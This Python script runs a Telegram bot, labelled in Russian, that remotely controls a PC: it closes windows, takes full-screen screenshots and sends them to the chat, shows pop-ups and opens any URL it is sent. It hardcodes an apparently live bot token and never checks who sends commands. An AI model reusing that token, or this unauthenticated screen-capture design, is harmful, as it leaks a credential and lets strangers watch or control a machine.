import pyautogui as pg
import telebot
from telebot import types
import os
import webbrowser

def find_file_recursive(file_name, start_path):
    for root, _, files in os.walk(start_path):
        if file_name in files:
            return os.path.join(root, file_name)
    return None # File not found

bot = telebot.TeleBot("7761187767:AAF1L3aMjzzw5jzu_UJ-8Q4lDVGQ80m4lDM")


@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Закрыть окно")
    btn2 = types.KeyboardButton("Скриншот")
    btn3 = types.KeyboardButton("Сообщение")
    btn4 = types.KeyboardButton("Открыть сайт")
    btn5 = types.KeyboardButton("Вопрос")
    markup.add(btn1, btn2, btn3, btn4, btn5)

    bot.send_message(
        message.chat.id,
        f"Привет {message.from_user.first_name}!",
        reply_markup=markup
    )


@bot.message_handler()
def main(message):
    if message.text == "Закрыть окно":
        pg.hotkey('alt', 'f4')
        bot.send_message(
            message.chat.id,
            f"окно зактрыто"
        )

    if message.text == "Скриншот":
        from PIL import ImageGrab

        # Capture the entire screen
        screenshot = ImageGrab.grab()
        screenshot.save("full_screen_screenshot.png")

        with open(find_file_recursive("full_screen_screenshot.png", "../"), 'rb') as photo:
            bot.send_photo(message.chat.id, photo)

    if message.text == "Сообщение":
        bot.send_message(message.chat.id,f"Напишите сообщение")
        bot.register_next_step_handler(message, message_window)

    if message.text == "Открыть сайт":
        bot.send_message(message.chat.id,f"Напишите сайт")
        bot.register_next_step_handler(message, open_site)

    if message.text == "Вопрос":
        bot.send_message(message.chat.id,f"Напишите вопрос")
        bot.register_next_step_handler(message, question_window)



def message_window(message):
    pg.alert(text=message.text, title='Сообщение', button='OK')

def question_window(message):
    masg = pg.prompt(text=message.text, title="Вопрос")
    bot.send_message(message.chat.id, f"Ответ от пк: {masg}")

def open_site(message):
    try:
        webbrowser.open(message.text)
    except ZeroDivisionError:
        bot.send_message(message.chat.id,f"Такого сайта не существует")

print("Бот запущен!")
bot.infinity_polling()